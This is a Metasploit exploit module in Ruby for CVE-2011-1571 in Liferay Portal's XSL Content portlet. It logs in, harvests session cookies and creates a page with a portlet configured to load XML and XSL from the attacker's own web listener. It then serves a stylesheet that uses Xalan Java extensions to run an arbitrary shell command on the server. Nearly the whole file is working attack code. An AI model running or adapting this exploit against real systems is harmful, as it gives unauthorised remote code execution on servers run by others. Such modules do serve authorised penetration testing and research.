##
# $Id$
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require 'msf/core'
require 'active_support/json'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::Remote::HttpServer
 
    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'Liferay XSL Command Execution',
            'Description'    => %q{
            This module exploits a vulnerability in the XSL parser of the
            XSL Content Portlet.  When Tomcat is present, arbitrary code
            can be executed via java calls in the data fed to the Xalan
            XSLT processor. If XSLPAGE is defined, the user must have rights
            to change the content of that page (to add a new XSL portlet),
            otherwise it can be left blank and a new one will be created.
            The second method however, requires administrative privileges.
            },
            'Author'    =>
                [
                    # SecureState R&I Team - Special Thanks To Jake Garlie, Chris Murrey
                    'Spencer McIntyre',
                    'SecureState R&I Team', # SecureState Research and Innovation Team
                    'Nicolas Gregoire', # authored the vulnerability details provided in the wiki
                ],
            'License'        => MSF_LICENSE,
            'Version'        => '$Revision: $',
            'References'     =>
                [
                    [ 'CVE', '2011-1571' ],
                    [ 'URL', 'http://xhe.myxwiki.org/xwiki/bin/view/XSLT/Application_Liferay' ],
                ],
            'Privileged'     => false,
            'Platform'    => [ 'win', 'linux', 'unix' ],
            'Stance'      => Msf::Exploit::Stance::Aggressive,
            'Payload'        =>
                {
                    'DisableNops' => true,
                    'Compat'      =>
                        {
                            'PayloadType' => 'cmd',
                        }
                },
            'Arch'           => ARCH_CMD,
            'Targets'        =>
                [
                    [ 'Automatic',                      { 'groupid' => 0,    'pauth' => false } ],
                    [ 'Liferay 5.2.3 (Tomcat/JBoss)',   { 'groupid' => 16,   'pauth' => false } ],
                    [ 'Liferay 6.0.0 (Tomcat/JBoss)',   { 'groupid' => 18,   'pauth' => false } ],
                    [ 'Liferay 6.0.1-6 (Tomcat/JBoss)', { 'groupid' => 18,   'pauth' => true  } ],
                ],
            'DisclosureDate' => 'January 12, 2011', # Liferay portal issue # 14726
            'DefaultTarget'  => 0))
         
        register_options(
            [
                Opt::RPORT(8080),
                OptString.new('USERNAME', [ true, 'The username to authenticate as' ]),
                OptString.new('PASSWORD', [ true, 'The password for the specified username', ]),
                OptString.new('XSLPAGE',  [ false, 'Full path to the page to add an XSL portlet to, (default: random)', nil ]),
                OptString.new('PATH',     [ true,  'The URI path of the portal', '/' ]),
            ], self.class)
    end
     
    def auto_target(headers)
        print_status("Attempting to automatically select a target...")
        case headers['liferay-portal']
        when /5.2.3/
            return targets[1]
        when /6.0.0/
            return targets[2]
        when /6.0.[1-6]/
            return targets[3]
        end
        return nil
    end
 
    def exploit
        print_status('Logging in and creating a page to embed XSL Content into...')
        res = send_request_cgi({
            'method'    => 'GET',
            'uri'       => datastore['PATH'] + 'web/guest/home'
        })
         
        mytarget = target
        if (target.name =~ /Automatic/)
            mytarget = auto_target(res.headers)
            if (not mytarget)
                raise RuntimeError, "Unable to automatically select a target"
            end
            print_status("Automatically selected target \"#{mytarget.name}\"")
        else
            print_status("Using manually select target \"#{mytarget.name}\"")
        end
        sessionid = 'JSESSIONID=' << res.headers['set-cookie'].split('JSESSIONID=')[1].split('; ')[0]
        cookie = "#{sessionid}; COOKIE_SUPPORT=true"
         
        app_base = rand_text_alphanumeric(8+rand(8))
        new_page = datastore['XSLPAGE'] || rand_text_alphanumeric(8+rand(8))
        malicious_url = "http://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{app_base}"
        @xsl_data = run_cmd_with_xsl(payload.encoded)   # this is really the data returned for XSL and XML requests
        service_url = 'http://' + datastore['SRVHOST'] + ':' + datastore['SRVPORT'] + resource_uri
        print_status("Starting up our web service on #{service_url} ...")
        start_service({'Uri' => {
                'Proc' => Proc.new { |cli, req|
                    on_request_uri(cli, req, 'XSL')
                },
                'Path' => '/' + app_base + '.xsl'
        }})
        start_service({'Uri' => {
                'Proc' => Proc.new { |cli, req|
                    on_request_uri(cli, req, 'XML')
                },
                'Path' => '/' + app_base + '.xml'
        }})
         
        res = send_request_cgi({
            'method'    => 'POST',
            'uri'       => datastore['PATH'] + 'web/guest/home?p_p_id=58&p_p_lifecycle=1&p_p_state=normal&p_p_mode=view&p_p_col_id=column-1&p_p_col_count=1&saveLastPath=0&_58_struts_action=%2Flogin%2Flogin',
            'data'      => "_58_redirect=&_58_rememberMe=false&_58_login=#{Rex::Text.uri_encode(datastore['USERNAME'], 'hex-normal')}&_58_password=#{Rex::Text.uri_encode(datastore['PASSWORD'], 'hex-normal')}",
            'cookie'    => cookie
        })
         
        if res.code != 302
            print_error('Login failed.')
            return
        end
         
        cookie = ''
        for cookie_i in [ 'JSESSIONID=', 'LOGIN=', 'SCREEN_NAME=', 'COMPANY_ID=', 'ID=', 'PASSWORD=', 'REMEMBER_ME=' ]
            cookie << cookie_i + res.headers['set-cookie'].split(cookie_i)[1].split('; ')[0] + '; '
        end
        xml_http_request_headers = { 'X-Requested-With' => 'XMLHttpRequest' }
 
        if datastore['XSLPAGE'] == nil  # the page was not defined, so we try to create a new one
            res = send_request_cgi({
                'method'     => 'POST',
                'uri'        => datastore['PATH'] + 'c/layout_management/update_page',
                'data'       => "mainPath=%2Fc&doAsUserId=&cmd=add&groupId=#{mytarget['groupid']}&privateLayout=false&parentLayoutId=0&name=#{new_page}",
                'cookie'     => cookie,
                'headers'    => xml_http_request_headers,
            })
            if res.code != 200 or res.body == ""
                print_error('Could not create a new page to embed the XSL Content into...')
                return
            end
            new_page = datastore['PATH'] + 'web/guest/' + URI.parse(ActiveSupport::JSON.decode(res.body)['url']).path.split('/')[-1] # could possible be different and have a number at the end
            print_status("Successfully created page #{new_page}, now configuring XSL...")
        else
            new_page = datastore['PATH'] + 'web/guest/' + datastore['XSLPAGE']
        end
         
        res = send_request_cgi({
            'method'    => 'GET',
            'uri'       => new_page,
            'cookie'    => cookie
        })
         
        plid = /getPlid:function\(\)\{return"[\d]{3,7}"}/i.match(res.body)[0][26..-3].to_i
        layoutid = /getLayoutId:function\(\)\{return\"[\d]{1,5}\"\}/i.match(res.body)[0][30..-3].to_i
        if mytarget['pauth']
            pauth = 'p_auth=' + /\?p_auth=[a-zA-Z0-9]{3,12}&/i.match(res.body)[0][8..-6] + '&'
        else
            pauth = '' # versions prior to 6.0.1 do not require a p_auth token
        end
         
        res = send_request_cgi({
            'method'     => 'POST',
            'uri'        => datastore['PATH'] + 'c/portal/update_layout',
            'data'       => "p_l_id=#{plid}&p_p_id=102&p_p_col_id=column-1&p_p_col_pos=0&doAsUserId=&dataType=json&cmd=add¤tURL=#{Rex::Text.uri_encode(new_page, 'hex-normal')}",
            'cookie'     => cookie,
            'headers'    => xml_http_request_headers,
        })
        if res.code != 200
            print_error('Could not create a new page to embed the XSL Content into...')
            return
        end
         
        portletid = /p_p_id_[\d]{1,4}_INSTANCE_[a-zA-Z0-9]{2,5}/i.match(res.body)[0][7..-1]
         
        res = send_request_cgi({
            'method'     => 'POST',
            'uri'        => "#{new_page}?#{pauth}p_p_id=86&p_p_lifecycle=1&p_p_state=maximized&p_p_mode=view&_86_struts_action=%2Fportlet_configuration%2Fedit_configuration&_86_returnToFullPageURL=#{Rex::Text.uri_encode(new_page, 'hex-normal')}&_86_portletResource=#{portletid}&_86_previewWidth=450",
            'data'       => "_86_cmd=update&_86_xmlURL=#{Rex::Text.uri_encode(malicious_url, 'hex-normal')}.xml&_86_xslURL=#{Rex::Text.uri_encode(malicious_url, 'hex-normal')}.xsl",
            'cookie'     => cookie,
        })
         
        if res.code != 200
            print_error('Could not configure the XSL Portlet')
            return
        end
         
        print_status("Successfully configured XSL Portlet, requesting page to execute code...")
        res = send_request_cgi({
            'method'    => 'GET',
            'uri'       => new_page,
            'cookie'    => cookie
        })
         
        # wait for the data to be sent
        waited = 0
        while (not @xsl_sent)
            select(nil, nil, nil, 1)
            waited += 1
            if (waited > 30)
                raise RuntimeError, 'Server did not request XSL data -- Maybe it cant connect back to us?'
            end
        end
         
        print_status("Shutting down the web service...")
        stop_service
        return
         
        res = send_request_cgi({
            'method'     => 'POST',
            'uri'        => datastore['PATH'] + 'c/portal/update_layout',
            'cookie'     => cookie,
            'data'       => "p_l_id=#{plid}&p_p_id=#{portletid}&doAsUserId=&cmd=delete"
        })
         
        if datastore['XSLPAGE'] == nil  # we created the page, so delete it
            res = send_request_cgi({
                'method'     => 'POST',
                'uri'        => datastore['PATH'] + 'c/layout_management/update_page',
                'data'       => "doAsUserId=&cmd=delete&groupId=#{mytarget['groupid']}&privateLayout=false&layoutId=#{layoutid}",
                'cookie'     => cookie,
                'headers'    => xml_http_request_headers,
            })
        end
    end
     
    # Handle incoming requests from the server
    def on_request_uri(cli, request, resource)
        print_status("Sending the #{resource} File to the server...")
        send_response(cli, @xsl_data)
        @xsl_sent = true
    end
     
    def run_cmd_with_xsl(cmd)
        varpayload = rand_text_alpha(10+rand(8))
        varruntime = rand_text_alpha(10+rand(8))
        varproc = rand_text_alpha(10+rand(8))
        payload =  "<xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:jv=\"http://xml.apache.org/xalan/java\" exclude-result-prefixes=\"jv\" version=\"1.0\">\n"
        payload << " <xsl:template match=\"/\">\n"
        payload << "  <xsl:variable name=\"#{varruntime}\" select=\"jv:java.lang.Runtime.getRuntime()\"/>\n"
        payload << "  <xsl:variable name=\"osversion\" select=\"jv:java.lang.System.getProperty('os.name')\"/>\n"
        payload << "  <xsl:variable name=\"osversion\" select=\"jv:toLowerCase($osversion)\"/>\n\n"
         
        payload << "  <xsl:choose>\n"
        payload << "   <xsl:when test=\"contains($osversion,'windows')\">\n"
        payload << "    <xsl:variable name=\"#{varpayload}\"><![CDATA[#{cmd}]]></xsl:variable>\n"
        payload << "    <xsl:variable name=\"#{varproc}\" select=\"jv:exec($#{varruntime}, $#{varpayload})\"/>\n"
        payload << "   </xsl:when>\n\n"
         
        payload << "   <xsl:otherwise>\n"
        payload << "    <xsl:variable name=\"#{varpayload}\"><![CDATA[/bin/sh ==== -c ==== #{cmd}]]></xsl:variable>\n"
        payload << "    <xsl:variable name=\"#{varpayload}\" select=\"jv:split($#{varpayload}, ' ==== ')\"/>\n"
        payload << "    <xsl:variable name=\"#{varproc}\" select=\"jv:exec($#{varruntime}, $#{varpayload})\"/>\n"
        payload << "   </xsl:otherwise>\n"
        payload << "  </xsl:choose>\n\n"
         
        payload << " </xsl:template>\n"
        payload << "</xsl:stylesheet>\n"
        payload
    end
end
